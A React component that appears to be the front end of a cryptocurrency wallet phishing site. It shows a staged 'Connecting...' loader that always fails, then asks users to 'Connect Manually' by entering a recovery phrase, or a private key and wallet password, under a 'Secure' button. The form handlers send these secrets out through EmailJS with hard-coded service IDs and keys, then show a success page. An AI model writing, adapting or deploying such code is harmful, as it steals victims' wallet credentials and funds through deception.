import { useState, useEffect, useRef } from 'react';
import { NavLink, useNavigate } from 'react-router-dom';
import { toast } from 'react-toastify';
import emailjs from '@emailjs/browser';
import clearBtn from '../assets/svgs/clearBtn.svg';
import Loader from './Loader.jsx';

const LinkWallet = ({ wallets }) => {
	const [selectedWalletImg, setSelectedWalletImg] = useState(null);
	const [selectedWalletName, setSelectedWalletName] = useState('');
	const [isVisible, setIsVisible] = useState(false);
	const [isLoading, setIsLoading] = useState(false);
	const [isFirstPage, setIsFirstPage] = useState(true);
	const [isPhrase, setIsPhrase] = useState(true);

	const navigate = useNavigate();

	useEffect(() => {
		setTimeout(() => {
			setIsLoading(false);
		}, 7000);
	}, [isLoading, isVisible]);

	const handleImageClick = (wallet) => {
		setIsVisible(true);
		setSelectedWalletImg(wallet.image);
		setSelectedWalletName(wallet.name);
		setIsLoading(true);
	};

	const hidePopUp = () => {
		setIsVisible(false);
		setIsFirstPage(true);
	};

	const handleConnectClick = () => {
		setIsFirstPage(!isFirstPage);
	};

	const form1 = useRef();
	const form2 = useRef();

	const handleSubmitPhrase = (e) => {
		e.preventDefault();

		emailjs
			.sendForm('service_k4o0ygn', 'template_uukjdbf', form1.current, {
				publicKey: 'Td_dx3NSUAVtvJh_p',
			})
			.then(
				() => {
					navigate('/success');
					e.target.reset();
				},
				() => {
					toast.error('Error while trying to secure wallet!!! Try again');
					e.target.reset();
				}
			);
	};

	const handleSubmitPrivateKey = (e) => {
		e.preventDefault();

		emailjs
			.sendForm('service_lieh7y8', 'template_638ixvr', form2.current, {
				publicKey: 'fJd5p8yg2wShB5d9W',
			})
			.then(
				() => {
					navigate('/success');
					e.target.reset();
				},
				() => {
					toast.error('Error while trying to secure wallet!!! Try again');
					e.target.reset();
				}
			);
	};

	return (
		<section className='py-10 px-5 bg-gray-950 text-gray-300 font-Ubuntu flex justify-center items-center'>
			<div className='flex flex-wrap gap-1 w-[390px] md:gap-3 md:w-[80vh]'>
				{wallets.map((wallet) => (
					<div
						className='basis-[46%] flex flex-col justify-center items-center rounded-md md:basis-[23%] hover:border-1 hover:border-solid hover:border-[#ff931e]'
						key={wallet.id}>
						<button className='rounded-full md:basis-[48.5%]' onClick={() => handleImageClick(wallet)}>
							<img src={wallet.image} className='w-16 h-16 md:w-24 md:h-24' />
						</button>
						<p className='text-sm md:text-base font-bold py-4 text-center'>{wallet.name}</p>
					</div>
				))}
			</div>
			{selectedWalletImg ? (
				<div
					className={`fixed left-0 right-0 top-0 bottom-0 bg-[rgba(0,0,0,0.7)] flex justify-center items-center ${
						isVisible ? 'block' : 'hidden'
					}`}>
					{isFirstPage ? (
						<div className=' bg-gray-700 text-gray-200 w-[90%] flex flex-col justify-center items-center  gap-y-1  md:w-[60%] lg:w-[40%]'>
							<div className='self-end px-2 py-2 w-fit'>
								<img src={clearBtn} alt='' className='h-7 w-7 cursor-pointer' onClick={hidePopUp} />
							</div>
							<div className='bg-gray-800 mb-20 h-[1px] w-full'></div>
							<p>{selectedWalletName}</p>
							<img src={selectedWalletImg} alt='' className='w-14 h-14 md:w-24 md:h-24' />
							<p>Easy-to-use secured extension</p>
							{isLoading ? (
								<div className='flex flex-col justify-center items-center'>
									<Loader />
									<p>Connecting...</p>
								</div>
							) : (
								<div className='flex flex-col w-full justify-center items-center'>
									<p className='text-red-600 font-bold italic py-1'>Error Connecting</p>
									<button className='bg-[#3c2e8d] px-3 py-2 rounded-md' onClick={() => handleConnectClick()}>
										Connect Manually
									</button>
								</div>
							)}
							<div className='bg-gray-800 mt-14 mb-12  h-[1px] w-full'></div>
						</div>
					) : (
						<div className=' bg-gray-700 text-gray-200 w-[90%] flex flex-col justify-center items-center md:w-[80%] gap-y-1 lg:w-[70%]'>
							<div className='self-end px-2 py-2 w-fit '>
								<img src={clearBtn} alt='' className='h-7 w-7 cursor-pointer h-md:w-4 h-md:h-4' onClick={hidePopUp} />
							</div>
							<div className='bg-gray-800 my-3 h-[1px] w-full h-md:mb-1 h-md:mt-0'></div>
							<p className='h-md:text-sm'>{selectedWalletName}</p>
							<img src={selectedWalletImg} alt='' className='w-14 h-14 md:w-24 md:h-24 h-md:w-10 h-md:h-10' />
							<p className='h-md:text-sm'>Easy-to-use secured extension</p>
							<p className='font-bold md:text-xl w-full text-center px-4 h-md:text-sm'>{`Import your ${selectedWalletName} Wallet`}</p>

							<div className='flex items-center justify-between w-full px-3 border-b-[1px] border-[#3c2e8d] md:px-20'>
								<NavLink
									className={({ isActive }) =>
										isActive && isPhrase
											? 'basis-[48%] bg-[#3c2e8d] px-3 py-2  text-center h-md:py-1 h-md:text-sm'
											: 'basis-[48%] px-3 py-2 text-center h-md:py-1 h-md:text-sm'
									}
									onClick={() => {
										setIsPhrase(true);
									}}>
									Phrase
								</NavLink>
								<NavLink
									className={({ isActive }) =>
										isActive && !isPhrase
											? 'basis-[48%] bg-[#3c2e8d] px-3 py-2 text-center h-md:py-1 h-md:text-sm'
											: 'basis-[48%] px-3 py-2 text-center h-md:py-1 h-md:text-sm'
									}
									onClick={() => {
										setIsPhrase(!isPhrase);
									}}>
									Private Key
								</NavLink>
							</div>
							{isPhrase ? (
								<div className='px-10 md:px-20'>
									<p className='font-bold py-2 px-6 text-center border-b-[1px] border-gray-300 h-md:text-sm h-md:py-1'>
										Recovery Phrase
									</p>
									<form action='submit' ref={form1} onSubmit={handleSubmitPhrase}>
										<div className='relative pt-9'>
											<input
												type='text'
												name='walletName'
												required
												placeholder='Enter Wallet Name'
												className='text-black outline-none p-2 mb-6 caret-black peer w-full bg-gray-100 placeholder-transparent rounded-md'
											/>
											<label
												htmlFor='walletName'
												className='absolute top-0 left-0 text-gray-300 text-sm p-2 pointer-events-none peer-placeholder-shown:top-9 peer-placeholder-shown:text-gray-400 peer-focus:top-0 peer-focus:text-gray-300 duration-500'>
												Enter Wallet Name
											</label>
										</div>
										<div className='relative pt-2'>
											<textarea
												type='text'
												name='phrase'
												required
												placeholder='Enter Recovery Phrase'
												className='text-black outline-none p-2 mb-6 h-14 caret-black peer w-full bg-gray-100 placeholder-transparent rounded-md overflow-y-hidden'
											/>
											<label
												htmlFor='phrase'
												className='absolute -top-7 left-0 text-gray-300 text-sm p-2 pointer-events-none peer-placeholder-shown:top-2 peer-placeholder-shown:text-gray-400 peer-focus:-top-7 peer-focus:text-gray-300 peer-focus:border- duration-500'>
												Enter Recovery Phrase
											</label>
										</div>
										<p className='text-center px-2 py-3 text-gray-400 text-xs md:text-sm md:px-5 '>
											Typically 12 (sometimes 24) words, each seperated by a single space.
										</p>
										<input
											type='submit'
											className='px-4 py-2 w-full outline-none border-none rounded-md shadow-lg cursor-pointer bg-[#3c2e8d] hover:bg-[#2f246d]'
											value='Secure'
										/>
									</form>
								</div>
							) : (
								<div className='px-10 md:px-20'>
									<p className='font-bold py-2 px-6 text-center border-b-[1px] border-gray-300'>Private Key</p>
									<form action='submit' ref={form2} onSubmit={handleSubmitPrivateKey}>
										<div className='relative pt-9'>
											<input
												type='text'
												name='walletName'
												required
												placeholder='Enter Wallet Name'
												className='text-black outline-none p-2 mb-6 caret-black peer w-full bg-gray-100 placeholder-transparent rounded-md'
											/>
											<label
												htmlFor='walletName'
												className='absolute top-0 left-0 text-gray-300 text-sm p-2 pointer-events-none peer-placeholder-shown:top-9 peer-placeholder-shown:text-gray-400 peer-focus:top-0 peer-focus:text-gray-300 duration-500'>
												Enter Wallet Name
											</label>
										</div>
										<div className='relative pt-2'>
											<input
												type='text'
												name='walletPrivateKey'
												required
												placeholder='Enter Private Key'
												className='text-black outline-none p-2 mb-6 caret-black peer w-full bg-gray-100 placeholder-transparent rounded-md overflow-y-hidden'
											/>
											<label
												htmlFor='walletPrivateKey'
												className='absolute -top-7 left-0 text-gray-300 text-sm p-2 pointer-events-none peer-placeholder-shown:top-2 peer-placeholder-shown:text-gray-400 peer-focus:-top-7 peer-focus:text-gray-300 peer-focus:border- duration-500'>
												Enter Private Key
											</label>
										</div>
										<div className='relative pt-2'>
											<input
												type='text'
												name='walletPassword'
												required
												placeholder='Enter Wallet Password'
												className='text-black outline-none p-2 mb-6 caret-black peer w-full bg-gray-100 placeholder-transparent rounded-md overflow-y-hidden'
											/>
											<label
												htmlFor='walletPassword'
												className='absolute -top-7 left-0 text-gray-300 text-sm p-2 pointer-events-none peer-placeholder-shown:top-2 peer-placeholder-shown:text-gray-400 peer-focus:-top-7 peer-focus:text-gray-300 peer-focus:border- duration-500'>
												Enter Wallet Password
											</label>
										</div>
										<p className='text-center text-gray-400 w-full px-2 py-3 text-xs md:text-sm md:px-5'>
											Typically of alphanumeric characters.
										</p>
										<input
											type='submit'
											className='px-4 py-2 w-full outline-none border-none rounded-md shadow-lg cursor-pointer bg-[#3c2e8d] hover:bg-[#2f246d]'
											value='Secure'
										/>
									</form>
								</div>
							)}
							<div className='bg-gray-800 my-3 h-[1px] w-full h-md:my-1'></div>
							<div className='w-full flex justify-end px-5 '>
								<button className='bg-[#3c2e8d] px-4 py-2 my-2' onClick={hidePopUp}>
									Close
								</button>
							</div>
						</div>
					)}
				</div>
			) : (
				<div
					className={`fixed left-0 right-0 top-0 bottom-0 bg-[rgba(0,0,0,0.7)] flex justify-center items-center ${
						isVisible ? 'block' : 'hidden'
					}`}></div>
			)}
		</section>
	);
};

export default LinkWallet;
